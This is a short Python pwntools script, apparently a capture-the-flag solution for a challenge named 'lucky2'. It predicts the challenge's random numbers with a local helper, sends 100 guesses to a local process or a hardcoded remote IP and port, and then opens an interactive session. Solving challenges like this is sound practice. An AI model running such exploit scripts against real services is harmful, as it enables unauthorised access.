#!/usr/bin/env python
from time import time
from os import system
from pwn import *

### DEBUGGGING ###

DEBUG = True

if DEBUG:
    r = process('lucky2')
    timeout = 0.1

#    gdb.attach(r,'''
#    b main
#    ''')
    context.log_level = 'debug'

else:
    r = remote('167.99.143.206',65032)
    timeout = 0.3

def ss(s):
    sleep(timeout)
    return r.sendline(s)

def rr(s):
    sleep(timeout)
    return r.recvuntil(s)

### ADDRESS ###
### PAYLOAD ###
### EXPLOIT ###

def main():
    rr('?\n')
    ss('a')

    system('./random > randmal')
    rd = (open('randmal', 'r').read()).split('\n')[:-1]

    for i in range(0,100):
        rr(']\n')
        ss(rd[i])

    r.interactive()

if __name__ == '__main__':
    try:
        main()
    except:
        log.info('exception occur')
